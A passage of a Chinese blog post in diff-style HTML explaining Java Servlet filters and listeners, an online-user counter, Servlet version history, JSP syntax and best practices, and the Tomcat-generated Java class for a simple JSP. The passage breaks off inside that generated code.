+<p>“Servlet 中另一个常用的特性是 <code>Filter</code>，用于为所有 Servlet 添加全局性的鉴权和过滤”</p>
+<p>“上述例子同样使用了注解来添加，如果使用配置文件的方式，可以在 <code>web.xml</code> 中加上对应的 <code>&lt;filter&gt;</code>、<code>&lt;filter-mapping&gt;</code> 标签。这里有个比较值得注意的点事 <code>urlPatterns</code> 的匹配方式，一开始我以为是正则表达式，但其实在 Servlet 的标准中有明确的定义，比如优先进行精确匹配，否则使用最长的路径匹配，然后是后缀匹配等，规则定义在标准的 12 章 (Mapping Requests to Servlets) 中，可以配合容器的源码去进行分析。”</p>
+<p>“另外 Servlet 标准中还支持注册 <code>Listener</code> 作为监听器，实现上下文、会话、请求的监听能力，主要用于线上人数的统计和会话的监控和处理。实现方法与 Servlet/Filter 大同小异，这里就不再举例了。”</p>
+<p>在Java Servlet标准中，监听器（Listener）被用于监听应用程序中的不同事件，例如：Servlet上下文（Context）的创建和销毁、HTTP会话（Session）的创建和销毁、以及请求（ServletRequest）的创建和销毁。监听器可以用于实现各种功能，如在线人数统计、会话监控、资源初始化和清理等。</p>
+<p>要使用监听器，需要实现相应的监听器接口，并在<code>web.xml</code>文件中注册监听器，或者使用注解（如<code>@WebListener</code>）进行注册。以下是Servlet标准中的主要监听器接口：</p>
+<ol>
+<li><code>ServletContextListener</code>: 用于监听Servlet上下文的创建和销毁事件。实现此接口，可以在应用程序启动和关闭时执行一些操作，如初始化资源、关闭数据库连接等。</li>
+<li><code>HttpSessionListener</code>: 用于监听HTTP会话的创建和销毁事件。实现此接口，可以在会话创建和销毁时执行一些操作，如统计在线人数、清理会话资源等。</li>
+<li><code>ServletRequestListener</code>: 用于监听ServletRequest的创建和销毁事件。实现此接口，可以在请求创建和销毁时执行一些操作，如记录请求日志、设置请求属性等。</li>
+</ol>
+<p>以下是一个简单的示例，实现<code>HttpSessionListener</code>以统计在线人数：</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">javax.servlet.annotation.WebListener</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpSessionEvent</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpSessionListener</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.concurrent.atomic.AtomicInteger</span><span class="o">;</span>
+
+<span class="nd">@WebListener</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">OnlineUserCounter</span> <span class="kd">implements</span> <span class="n">HttpSessionListener</span> <span class="o">{</span>
+
+    <span class="kd">private</span> <span class="n">AtomicInteger</span> <span class="n">onlineUserCount</span> <span class="o">=</span> <span class="k">new</span> <span class="n">AtomicInteger</span><span class="o">(</span><span class="n">0</span><span class="o">);</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">sessionCreated</span><span class="o">(</span><span class="n">HttpSessionEvent</span> <span class="n">se</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">// 会话创建，增加在线人数
+</span><span class="c1"></span>        <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="n">onlineUserCount</span><span class="o">.</span><span class="na">incrementAndGet</span><span class="o">();</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;New session created. Online users: &#34;</span> <span class="o">+</span> <span class="n">count</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">sessionDestroyed</span><span class="o">(</span><span class="n">HttpSessionEvent</span> <span class="n">se</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">// 会话销毁，减少在线人数
+</span><span class="c1"></span>        <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="n">onlineUserCount</span><span class="o">.</span><span class="na">decrementAndGet</span><span class="o">();</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Session destroyed. Online users: &#34;</span> <span class="o">+</span> <span class="n">count</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>在这个示例中，我们使用<code>@WebListener</code>注解注册监听器。</p>
+<p><code>OnlineUserCounter</code>实现了<code>HttpSessionListener</code>接口，通过原子整数<code>AtomicInteger</code>来安全地统计在线人数。每当有新的会话创建时，<code>sessionCreated</code>方法被调用并增加在线人数；每当有会话销毁时，<code>sessionDestroyed</code>方法被调用并减少在线人数。</p>
+<p>总之，Servlet标准中的监听器（Listener）用于监听应用程序中的不同事件，如上下文、会话和请求的创建和销毁。通过实现相应的监听器接口并进行注册，可以实现诸如在线人数统计、会话监控等功能。与Servlet和Filter类似，监听器是Java Web应用程序中的一个重要组件。</p>
+<p>“Servlet 的标准经过了多个版本的迭代，一些关键的版本和特性如下:</p>
+<ul>
+<li>Java Servlet 2.0 (1997): JDK 1.1</li>
+<li>Java Servlet 2.1 (1998): 第一个官方版本的标准，增加 <code>RequestDispatcher</code> 和 <code>ServletContext</code>；</li>
+<li>Java Servlet 2.2 (1999): 正式成为 J2EE 的一部分，引入 <code>.war</code> 独立 web 应用格式；</li>
+<li>Java Servlet 2.3 (2001): 增加 <code>Filter</code> API，即上文介绍的过滤器；</li>
+<li>Java Servlet 2.5 (2005): 要求 Java SE 5，开始支持注解；</li>
+<li>Java Servlet 3.0 (2009): 改善注解处理，引入了 <code>@WebServlet</code>、<code>@WebFilter</code> 等注解支持部分参数化；支持文件上传；</li>
+<li>Java Servlet 3.1 (2013): 支持非阻塞 I/O，Websocket；</li>
+<li>Java Servlet 4.0 (2017): 支持 HTTP/2；</li>
+<li>Jakarta Servlet 4.0.3 (2019): 捐赠给 Eclipse 开源基金，重命名 Java 商标；</li>
+<li>Jakarta Servlet 5.0 (2020): 包名从 <code>javax.servlet</code> 转为 <code>jakarta.servlet</code>；</li>
+<li>Jakarta Servlet 6.0 (2022): 增加了一些没人关心的特性；</li>
+</ul>
+<p>完整的列表可以参考 Wikipedia 中的 Servlet API history 一节。”</p>
+<h2 id="jsp">JSP</h2>
+<p>“虽然我们可以用 Servlet 来生成网页中的动态内容，但这个过程相对繁琐。从上面的示例代码中可以看出，所有文本和标签都是硬编码，即使只做出微小的修改，也需要对源码进行重新编译和部署。JSP 解决了 Servlet 的这些问题，它是 Servlet 很好的补充，可以专门用作为用户呈现视图（View），而 Servlet 作为控制器（Controller）专门负责处理用户请求并转发或重定向到某个页面。</p>
+<p>JSP 的全称是 Java Server Pages，包含一系列技术的组合，既表示动态网页的框架，也表示一种文件类型。JSP 的标准为 <a href="https://jcp.org/en/jsr/detail?id=245" target="_blank" rel="noopener noreffer ">JSR 245</a>，其中包含两个主要文档，分别是 JSP 的标准文档和 JSP EL 表达式的标准。”</p>
+<p>Java Server Pages (JSP) 是一种基于 Java 的服务器端技术，用于动态创建和呈现 Web 页面。JSP 技术可以与 HTML、XML、JavaScript 或其他 Web 技术结合使用，提供灵活的 Web 应用程序开发方式。</p>
+<p>JSP 技术允许 Web 开发人员将 Java 代码嵌入到 HTML 页面中，以便在服务器端执行，生成响应内容。JSP 文件的扩展名通常为 <code>.jsp</code>。</p>
+<h3 id="基本语法">基本语法</h3>
+<p>“JSP 的基本语法可以总结如下:</p>
+<ul>
+<li><code>&lt;% code %&gt;</code> scriptlet 可以用来包裹和执行 Java 代码，也可以用 <code>&lt;jsp:scriptlet&gt;</code> 标签来进行包含；</li>
+<li><code>&lt;%! declaration; [ declaration; ]+ ... %&gt;</code> 用于变量声明，同 <code>&lt;jsp:declaration&gt;</code>；</li>
+<li><code>&lt;%= expr %&gt;</code> 用来包括和执行表达式，表达式的结果作为 HTML 的内容，同 <code>&lt;jsp:expression&gt;</code>；</li>
+<li><code>&lt;%-- comment --%&gt;</code> 为 JSP 注释，注释中的内容会被 JSP 引擎忽略；</li>
+<li><code>&lt;%@ directive attribute=&quot;value&quot; %&gt;</code> 指令，影响对应 Servlet 的类结构，后面细说；</li>
+<li><code>&lt;jsp:action_name attribute=&quot;value&quot; /&gt;</code> 使用 XML 控制 Servlet 引擎的的行为，称为 action；</li>
+<li>…</li>
+</ul>
+<p>完整的语法可以参考本节末尾的 JSP Tutorial 或者相关教程。”</p>
+<p>JSP 基本语法包括以下几种元素：</p>
+<ol>
+<li>
+<p><strong>指令</strong>：指令用于设置 JSP 页面的属性和行为。指令以 <code>&lt;%@</code> 开始，以 <code>%&gt;</code> 结束。常见的 JSP 指令包括：</p>
+<ul>
+<li>page 指令：用于定义页面特性，如编码、缓存策略等。</li>
+<li>include 指令：用于将其他文件（如 HTML 或 JSP 文件）的内容包含到当前页面中。</li>
+<li>taglib 指令：用于引入 JSP 标签库，以便使用自定义标签。</li>
+</ul>
+<p>示例：</p>
+<pre><code class="language-jsp" data-lang="jsp">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; %&gt;
+&lt;%@ include file=&quot;header.jsp&quot; %&gt;
+&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot; %&gt;
+</code></pre></li>
+<li>
+<p><strong>脚本元素</strong>：JSP 支持三种类型的脚本元素，用于嵌入 Java 代码：</p>
+<ul>
+<li>声明：声明用于定义变量和方法，以 <code>&lt;%!</code> 开始，以 <code>%&gt;</code> 结束。</li>
+<li>脚本片段：脚本片段用于执行 Java 代码，以 <code>&lt;%</code> 开始，以 <code>%&gt;</code> 结束。</li>
+<li>表达式：表达式用于输出 Java 表达式的值，以 <code>&lt;%=</code> 开始，以 <code>%&gt;</code> 结束。</li>
+</ul>
+<p>示例：</p>
+<pre><code class="language-jsp" data-lang="jsp">&lt;%! int count = 0; %&gt;
+&lt;% count++; %&gt;
+&lt;%= &quot;访问次数：&quot; + count %&gt;
+</code></pre></li>
+<li>
+<p><strong>JSP 标准动作</strong>：JSP 提供了一组预定义的动作元素，以 XML 格式表示，用于执行特定任务。常见的标准动作包括：</p>
+<ul>
+<li><code>&lt;jsp:include&gt;</code>：包含其他文件的内容。</li>
+<li><code>&lt;jsp:forward&gt;</code>：将请求转发到另一个资源。</li>
+<li><code>&lt;jsp:param&gt;</code>：向包含或转发的资源传递参数。</li>
+<li><code>&lt;jsp:useBean&gt;</code>：实例化 JavaBean，或者获取现有 JavaBean 的引用。</li>
+<li><code>&lt;jsp:setProperty&gt;</code>：设置 JavaBean 的属性值。</li>
+<li><code>&lt;jsp:getProperty&gt;</code>：获取 JavaBean 的属性值。</li>
+</ul>
+<p>示例：</p>
+<pre><code class="language-jsp" data-lang="jsp">&lt;jsp:useBean id=&quot;user&quot; class=&quot;com.example.User&quot; /&gt;
+&lt;jsp:setProperty name=&quot;user&quot; property=&quot;name&quot; value=&quot;John Doe&quot; /&gt;
+&lt;p&gt;Name: &lt;jsp:getProperty name=&quot;user&quot; property=&quot;name&quot; /&gt;&lt;/p&gt;
+</code></pre></li>
+<li>
+<p><strong>JSP 标签库</strong>：JSP 标签库是一组自定义标签，用于简化 JSP 页面中的复杂逻辑。常用的 JSP 标签库包括 JavaServer Pages Standard Tag Library (JSTL)。JSTL 包含以下几个标签库：</p>
+<ul>
+<li>Core：用于基本流程控制和变量操作，如 <code>&lt;c:if&gt;</code>、<code>&lt;c:forEach&gt;</code> 等。</li>
+<li>Formatting：用于格式化和国际化，如 <code>&lt;fmt:formatDate&gt;</code>、<code>&lt;fmt:message&gt;</code> 等。</li>
+<li>XML：用于处理 XML 数据，如 <code>&lt;x:parse&gt;</code>、<code>&lt;x:forEach&gt;</code> 等。</li>
+<li>SQL：用于执行 SQL 查询，如 <code>&lt;sql:query&gt;</code>、<code>&lt;sql:update&gt;</code> 等。</li>
+<li>Functions：用于提供通用字符串处理函数，如 <code>fn:trim</code>、<code>fn:contains</code> 等。</li>
+</ul>
+<p>示例：</p>
+<pre><code class="language-jsp" data-lang="jsp">&lt;c:forEach var=&quot;i&quot; begin=&quot;1&quot; end=&quot;10&quot;&gt;
+  &lt;p&gt;当前数字是：${i}&lt;/p&gt;
+&lt;/c:forEach&gt;
+</code></pre></li>
+</ol>
+<p>JSP 技术是一种易于使用且功能强大的服务器端技术，用于构建动态 Web 应用程序。通过 JSP，你可以在 HTML 页面中嵌入 Java 代码，实现服务器端的逻辑处理。JSP 提供了多种语法元素，包括指令、脚本元素、标准动作和标签库，帮助开发者更有效地编写 Web 应用程序。</p>
+<p>在实际开发中，为了提高代码的可读性和可维护性，通常会将业务逻辑和页面展示分离。这可以通过使用模型-视图-控制器（MVC）设计模式来实现。在基于 JSP 的 MVC 架构中，JSP 页面主要负责视图层，负责呈现数据；Java Servlet 负责控制器层，处理请求并调用模型层（Java 类）完成业务逻辑处理。</p>
+<p>使用 JSP 技术的一些最佳实践包括：</p>
+<ol>
+<li>尽量减少 JSP 页面中的 Java 代码，将业务逻辑移到 Servlet 和 Java 类中。</li>
+<li>使用 JSTL 和自定义标签库简化 JSP 页面，避免复杂的脚本逻辑。</li>
+<li>使用 include 指令或 <code>&lt;jsp:include&gt;</code> 动作将页面分割成可重用的组件。</li>
+<li>使用 JavaBean 和 JSP 标准动作（如 <code>&lt;jsp:useBean&gt;</code>、<code>&lt;jsp:setProperty&gt;</code> 和 <code>&lt;jsp:getProperty&gt;</code>）进行数据传递和操作。</li>
+<li>遵循 MVC 设计模式，将视图、控制器和模型层代码清晰地分离。</li>
+</ol>
+<p>JSP 技术现已成为 Java Web 开发的重要组成部分。尽管如今有许多其他服务器端技术，如 Spring Boot、JavaServer Faces（JSF）等，但 JSP 依然是许多 Java Web 应用程序的核心技术。掌握 JSP 的基本语法和最佳实践，将有助于你更有效地构建高质量的 Java Web 应用程序。</p>
+<h3 id="jspservlet">JspServlet</h3>
+<p>“JSP 作为一个脚本引擎，其本质上也是通过 Servlet 实现的，即 JSP 会被容器编译为对应的 Servlet 并加载。例如，下述简单的 <code>index.jsp</code> 文件:</p>
+<pre><code class="language-jsp" data-lang="jsp">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;h1&gt; config = &lt;%=config%&gt; &lt;/h1&gt;
+</code></pre><p>在被 Tomcat 容器加载后会生成如下的 Java 文件:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">org.apache.jsp</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.servlet.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.jsp.*</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">final</span> <span class="kd">class</span> <span class="nc">index_jsp</span> <span class="kd">extends</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">jasper</span><span class="o">.</span><span class="na">runtime</span><span class="o">.</span><span class="na">HttpJspBase</span>
+    <span class="kd">implements</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">jasper</span><span class="o">.</span><span class="na">runtime</span><span class="o">.</span><span class="na">JspSourceDependent</span><span class="o">,</span>
+                 <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">jasper</span><span class="o">.</span><span class="na">runtime</span><span class="o">.</span><span class="na">JspSourceImports</span> <span class="o">{</span>
+
+  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">jsp</span><span class="o">.</span><span class="na">JspFactory</span> <span class="n">_jspxFactory</span> <span class="o">=</span>
+          <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">jsp</span><span class="o">.</span><span class="na">JspFactory</span><span class="o">.</span><span class="na">getDefaultFactory</span><span class="o">();</span>
+
+  <span class="kd">private</span> <span class="kd">static</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Map</span><span class="o">&lt;</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">,</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Long</span><span class="o">&gt;</span> <span class="n">_jspx_dependants</span><span class="o">;</span>
+
+  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Set</span><span class="o">&lt;</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">&gt;</span> <span class="n">_jspx_imports_packages</span><span class="o">;</span>
+
+  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Set</span><span class="o">&lt;</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">&gt;</span> <span class="n">_jspx_imports_classes</span><span class="o">;</span>
+
+  <span class="kd">static</span> <span class="o">{</span>
+    <span class="n">_jspx_imports_packages</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">HashSet</span><span class="o">&lt;&gt;();</span>
+    <span class="n">_jspx_imports_packages</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;javax.servlet&#34;</span><span class="o">);</span>
+    <span class="n">_jspx_imports_packages</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;javax.servlet.http&#34;</span><span class="o">);</span>
+    <span class="n">_jspx_imports_packages</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;javax.servlet.jsp&#34;</span><span class="o">);</span>
+    <span class="n">_jspx_imports_classes</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+  <span class="o">}</span>
+
+  <span class="kd">private</span> <span class="kd">volatile</span> <span class="n">javax</span><span class="o">.</span><span class="na">el</span><span class="o">.</span><span class="na">ExpressionFactory</span> <span class="n">_el_expressionfactory</span><span class="o">;</span>
+  <span class="kd">private</span> <span class="kd">volatile</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">tomcat</span><span class="o">.</span><span class="na">InstanceManager</span> <span class="n">_jsp_instancemanager</span><span class="o">;</span>
+
+  <span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Map</span><span class="o">&lt;</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">,</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Long</span><span class="o">&gt;</span> <span class="nf">getDependants</span><span class="o">()</span> <span class="o">{</span>
+    <span class="k">return</span> <span class="n">_jspx_dependants</span><span class="o">;</span>
+  <span class="o">}</span>
+
+  <span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Set</span><span class="o">&lt;</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">&gt;</span> <span class="nf">getPackageImports</span><span class="o">()</span> <span class="o">{</span>
+    <span class="k">return</span> <span class="n">_jspx_imports_packages</span><span class="o">;</span>
+  <span class="o">}</span>
+
+  <span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Set</span><span class="o">&lt;</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">&gt;</span> <span class="nf">getClassImports</span><span class="o">()</span> <span class="o">{</span>
+    <span class="k">return</span> <span class="n">_jspx_imports_classes</span><span class="o">;</span>
+  <span class="o">}</span>
+
+  <span class="kd">public</span> <span class="n">javax</span><span class="o">.</span><span class="na">el</span><span class="o">.</span><span class="na">ExpressionFactory</span> <span class="nf">_jsp_getExpressionFactory</span><span class="o">()</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">_el_expressionfactory</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+      <span class="kd">synchronized</span> <span class="o">(</span><span class="k">this</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">_el_expressionfactory</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+          <span class="n">_el_expressionfactory</span> <span class="o">=</span> <span class="n">_jspxFactory</span><span class="o">.</span><span class="na">getJspApplicationContext</span><span class="o">(</span><span class="n">getServletConfig</span><span class="o">().</span><span class="na">getServletContext</span><span class="o">()).</span><span class="na">getExpressionFactory</span><span class="o">();</span>
+        <span class="o">}</span>
+      <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="k">return</span> <span class="n">_el_expressionfactory</span><span class="o">;</span>
+  <span class="o">}</span>
+
+  <span class="kd">public</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">tomcat</span><span class="o">.</span><span class="na">InstanceManager</span> <span class="nf">_jsp_getInstanceManager</span><span class="o">()</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">_jsp_instancemanager</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+      <span class="kd">synchronized</span> <span class="o">(</span><span class="k">this</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">_jsp_instancemanager</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+          <span class="n">_jsp_instancemanager</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">jasper</span><span class="o">.</span><span class="na">runtime</span><span class="o">.</span><span class="na">InstanceManagerFactory</span><span class="o">.</span><span class="na">getInstanceManager</span><span class="o">(</span><span class="n">getServletConfig</span><span class="o">());</span>
+        <span class="o">}</span>
+      <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="k">return</span> <span class="n">_jsp_instancemanager</span><span class="o">;</span>
+  <span class="o">}</span>
+
+  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">_jspInit</span><span class="o">()</span> <span class="o">{</span>
+  <span class="o">}</span>
+
+  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">_jspDestroy</span><span class="o">()</span> <span class="o">{</span>
+  <span class="o">}</span>
+
+  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">_jspService</span><span class="o">(</span><span class="kd">final</span> <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">http</span><span class="o">.</span><span class="na">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="kd">final</span> <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">http</span><span class="o">.</span><span class="na">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span>
+      <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span><span class="o">,</span> <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">ServletException</span> <span class="o">{</span>
+
+    <span class="k">if</span> <span class="o">(!</span><span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">DispatcherType</span><span class="o">.</span><span class="na">ERROR</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getDispatcherType</span><span class="o">()))</span> <span class="o">{</span>
+      <span class="kd">final</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">_jspx_method</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">();</span>
+      <span class="k">if</span> <span class="o">(</span><span class="s">&#34;OPTIONS&#34;</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">_jspx_method</span><span class="o">))</span> <span class="o">{</span>
+        <span class="n">response</span><span class="o">.</span><span class="na">setHeader</span><span class="o">(</span><span class="s">&#34;Allow&#34;</span><span class="o">,</span><span class="s">&#34;GET, HEAD, POST, OPTIONS&#34;</span><span class="o">);</span>
+        <span class="k">return</span><span class="o">;</span>
+      <span class="o">}</span>
+      <span class="k">if</span> <span class="o">(!</span><span class="s">&#34;GET&#34;</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">_jspx_method</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="s">&#34;POST&#34;</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">_jspx_method</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="s">&#34;HEAD&#34;</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">_jspx_method</span><span class="o">))</span> <span class="o">{</span>
+        <span class="n">response</span><span class="o">.</span><span class="na">setHeader</span><span class="o">(</span><span class="s">&#34;Allow&#34;</span><span class="o">,</span><span class="s">&#34;GET, HEAD, POST, OPTIONS&#34;</span><span class="o">);</span>
+        <span class="n">response</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="n">HttpServletResponse</span><span class="o">.</span><span class="na">SC_METHOD_NOT_ALLOWED</span><span class="o">,</span> <span class="s">&#34;JSPs only permit GET, POST or HEAD. Jasper also permits OPTIONS&#34;</span><span class="o">);</span>
+        <span class="k">return</span><span class="o">;</span>
+      <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">final</span> <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">jsp</span><span class="o">.</span><span class="na">PageContext</span> <span class="n">pageContext</span><span class="o">;</span>
+    <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">http</span><span class="o">.</span><span class="na">HttpSession</span> <span class="n">session</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="kd">final</span> <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">ServletContext</span> <span class="n">application</span><span class="o">;</span>
+    <span class="kd">final</span> <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">ServletConfig</span> <span class="n">config</span><span class="o">;</span>
+    <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">jsp</span><span class="o">.</span><span class="na">JspWriter</span> <span class="n">out</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="kd">final</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Object</span> <span class="n">page</span> <span class="o">=</span> <span class="k">this</span><span class="o">;</span>
+    <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">jsp</span><span class="o">.</span><span class="na">JspWriter</span> <span class="n">_jspx_out</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">jsp</span><span class="o">.</span><span class="na">PageContext</span> <span class="n">_jspx_page_context</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+
+
+    <span class="k">try</span> <span class="o">{</span>
+      <span class="n">response</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="s">&#34;text/html;charset=UTF-8&#34;</span><span class="o">);</span>
+      <span class="n">pageContext</span> <span class="o">=</span> <span class="n">_jspxFactory</span><span class="o">.</span><span class="na">getPageContext</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">,</span>
+      			<span class="kc">null</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span> <span class="n">8192</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+      <span class="n">_jspx_page_context</span> <span class="o">=</span> <span class="n">pageContext</span><span class="o">;</span>
+      <span class="n">application</span> <span class="o">=</span> <span class="n">pageContext</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">();</span>
+      <span class="n">config</span> <span class="o">=</span> <span class="n">pageContext</span><span class="o">.</span><span class="na">getServletConfig</span><span class="o">();</span>
+      <span class="n">session</span> <span class="o">=</span> <span class="n">pageContext</span><span class="o">.</span><span class="na">getSession</span><span class="o">();</span>
+      <span class="n">out</span> <span class="o">=</span> <span class="n">pageContext</span><span class="o">.</span><span class="na">getOut</span><span class="o">();</span>
+      <span class="n">_jspx_out</span> <span class="o">=</span> <span class="n">out</span><span class="o">;</span>
+
+      <span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="s">&#34;\n&#34;</span><span class="o">);</span>
+      <span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="s">&#34;&lt;h1&gt; config = &#34;</span><span class="o">);</span>
+      <span class="n">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="n">config</span><span class="o">);</span>
+      <span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="s">&#34; &lt;/h1&gt;&#34;</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Throwable</span> <span class="n">t</span><span class="o">)</span> <span class="o">{</span>
